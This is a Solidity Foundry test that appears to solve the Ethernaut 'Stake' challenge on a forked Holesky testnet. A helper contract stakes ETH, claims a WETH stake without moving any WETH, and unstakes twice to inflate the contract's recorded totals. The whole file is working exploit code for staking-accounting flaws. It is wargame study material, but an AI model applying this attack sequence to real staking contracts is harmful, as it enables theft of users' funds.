// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Stake} from "../../src/Ethernaut/Stake.sol";
import "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract StakeAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        Stake stake = Stake(0x42d0a8D6D32E8962B2b1EA5A1baD458201616aA1);
        Helper helper = new Helper();
        helper.attack{value: 0.002 ether}(stake);
        vm.stopPrank();

        assertTrue(
            address(stake).balance > 0 &&
                stake.totalStaked() > address(stake).balance &&
                stake.Stakers(playerAddress) &&
                stake.UserStake(playerAddress) == 0
        );
    }
}

contract Helper {
    function attack(Stake stake) external payable {
        stake.StakeETH{value: 0.002 ether}();
        IERC20 weth = IERC20(stake.WETH());
        weth.approve(address(stake), 0.002 ether);
        stake.StakeWETH(0.002 ether);
        stake.Unstake(0.001 ether);
        stake.Unstake(0.003 ether);
    }
}
